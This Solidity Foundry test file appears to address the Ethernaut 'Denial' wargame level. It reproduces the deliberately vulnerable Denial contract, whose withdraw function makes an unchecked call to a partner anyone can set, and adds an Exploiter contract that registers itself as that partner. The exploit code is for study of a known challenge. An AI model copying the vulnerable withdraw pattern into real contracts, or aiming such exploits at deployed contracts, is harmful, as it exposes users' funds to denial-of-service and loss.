// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {HuffDeployer} from "@foundry-huff/HuffDeployer.sol";

contract Denial3Test is Test {
    Denial denial;
    string public constant DENIAL_HUFF_LOCATION = "Denial";

    function setUp() public {
        // denial = new Denial();
        // deal(address(denial), 1e15);
        denial = Denial(payable(0x6185Be5dF343C299f9424B96A22296A5D4adcb10));
    }

    function test_fork() public {
        Exploiter exploiter = new Exploiter(address(denial));
        exploiter.setPartner();
        denial.withdraw();
    }
}

contract Exploiter {
    address public immutable denial;    

    constructor(address _instance) {
        denial = _instance;
    }

    function setPartner() external {
        IDenial(denial).setWithdrawPartner(address(this));
    }
}

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function partner() external view returns (address);
    function contractBalance() external view returns (uint256);
}

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}